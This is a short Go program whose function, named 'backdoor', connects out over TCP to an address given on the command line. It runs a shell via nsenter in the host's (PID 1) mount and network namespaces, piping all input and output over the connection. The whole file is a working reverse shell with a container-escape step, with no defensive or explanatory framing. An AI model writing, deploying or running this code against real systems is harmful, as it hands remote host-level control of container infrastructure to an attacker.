package main

import (
	"log"
	"net"
	"os"
	"os/exec"
)

func main() {
	addr := os.Args[1]
	shell := "/bin/sh"
	if len(os.Args) > 2 {
		shell = os.Args[2]
	}
	if err := backdoor(addr, shell); err != nil {
		log.Fatal(err)
	}
}

func backdoor(addr, shell string) error {
	c, err := net.Dial("tcp", addr)
	if err != nil {
		return err
	}
	defer c.Close()
	cmd := exec.Command("/nsenter", "-t", "1", "-m", "-n", "--", shell)
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	return cmd.Run()
}
